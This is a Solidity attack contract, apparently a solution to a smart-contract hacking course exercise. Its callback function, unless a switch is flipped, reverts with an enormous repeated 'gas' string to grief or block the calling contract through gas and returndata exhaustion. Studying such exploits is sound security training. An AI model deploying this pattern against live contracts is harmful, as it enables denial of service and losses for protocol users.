// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "../../interfaces/ICallbackContract.sol";

contract AttackContract {
    bool public allowExecution;

    function flipSwitch() public {
        allowExecution = !allowExecution;
    }

    function beforeExecution() external {
        if (allowExecution) return;

        string
            memory gas = "gasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgas";

        for (uint i; i < 9; i++) {
            gas = string.concat(gas, gas);
        }

        revert(gas);
    }
}
